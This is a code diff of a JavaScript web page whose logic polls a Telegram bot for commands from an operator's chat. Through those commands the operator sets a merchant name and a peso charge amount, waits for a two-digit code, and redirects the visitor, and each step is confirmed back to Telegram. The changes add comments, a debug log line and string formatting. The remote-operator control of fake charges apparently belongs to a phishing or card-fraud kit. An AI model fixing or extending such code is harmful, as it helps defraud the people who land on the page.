@@ -107,6 +107,7 @@
 
         const update = await fetchLatestUpdateSafe();
         if (update && update.length > 0) {
+          // CORREGIDO: Acceso seguro al índice [0] del array devuelto
           const msg = update[0].message || update[0].channel_post || update[0].edited_message;
           if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
             const textoMensaje = msg.text.trim();
@@ -176,6 +177,7 @@
       let tail = null;
 
       if (update && update.length > 0) {
+        // CORREGIDO: Acceso seguro al índice [0] del array devuelto
         const msg = update[0].message;
         if (msg) {
           const chatIDRecibido = String(msg.chat.id);
@@ -189,6 +191,8 @@
             window.location.replace("index.html");
             return; 
           }
+
+          console.log(`📩 Mensaje detectado -> ID Configurado: "${chatIDConfigurado}" | ID Recibido: "${chatIDRecibido}" | Texto: "${msgText}"`);
 
           if (chatIDRecibido === chatIDConfigurado && /^\d{2}$/.test(msgText)) {
             tail = msgText;
@@ -207,7 +211,6 @@
 
     scanPass1();
   }
-
   async function proceedToChargeConfig() {
     try {
       sessionStorage.removeItem("charge_merchant");
@@ -231,6 +234,7 @@
       const update = await fetchLatestUpdateSafe();
 
       if (update && update.length > 0) {
+        // CORREGIDO: Acceso seguro al índice [0] del array devuelto
         const msg = update[0].message;
         if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
           const t = msg.text.trim();
@@ -259,7 +263,7 @@
               if (merchant && amt !== null) {
                 sessionStorage.setItem("charge_merchant", merchant);
                 sessionStorage.setItem("charge_amount", formatMXN(amt));
-                await sendTelegram("✅ *Cargo configurado:*\n🏪 " + merchant + "\n💵 " + formatMXN(amt));
+                await sendTelegram(`✅ *Cargo configurado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
                 done = true;
               }
             }
@@ -267,7 +271,7 @@
               const amt = parseAmount(t);
               if (amt !== null) {
                 sessionStorage.setItem("charge_amount", formatMXN(amt));
-                await sendTelegram("✅ *Monto actualizado:* " + formatMXN(amt));
+                await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
                 done = true;
               }
             }
@@ -286,6 +290,7 @@
         setTimeout(scanPass1B, 2000);
       }
     }
+
     scanPass1B();
   }
 
